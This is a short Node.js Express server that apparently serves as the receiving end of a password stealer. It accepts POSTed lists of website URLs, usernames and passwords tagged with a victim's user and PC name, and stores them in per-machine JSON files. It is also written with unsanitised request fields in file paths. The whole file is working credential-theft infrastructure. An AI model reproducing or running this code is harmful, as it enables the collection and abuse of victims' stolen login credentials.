const express = require('express');                                                                                                                                                                           
const fs = require('fs'); 
 
const app = express(); 

app.use(express.json()); 


app.post("/app", (req, res) => { 
  if(!fs.existsSync("creds"))
  {
    fs.mkdirSync("creds")
  }
  var file = `creds/${req.body.username}@${req.body.pcname}.json`; 
  fs.openSync(file, "a+"); 

  for(const cred of req.body.data) 
  { 
    var existingData = fs.readFileSync(file, "utf8"); 
    var data; 
    if(existingData.length == 0) 
      data = [{ 
          url: cred.url, 
          username: cred.username, 
          password: cred.password 
        }] 

    else { 
      data = JSON.parse(existingData); 
      data.push({ 
          url: cred.url, 
          username: cred.username, 
          password: cred.password 
      }) 
    } 

    fs.writeFileSync(file, JSON.stringify(data)); 
  } 
  console.log(`Written ${req.body.data.length} Credentials.`)
  res.sendStatus(200); 
}); 

app.listen(5656, "0.0.0.0");
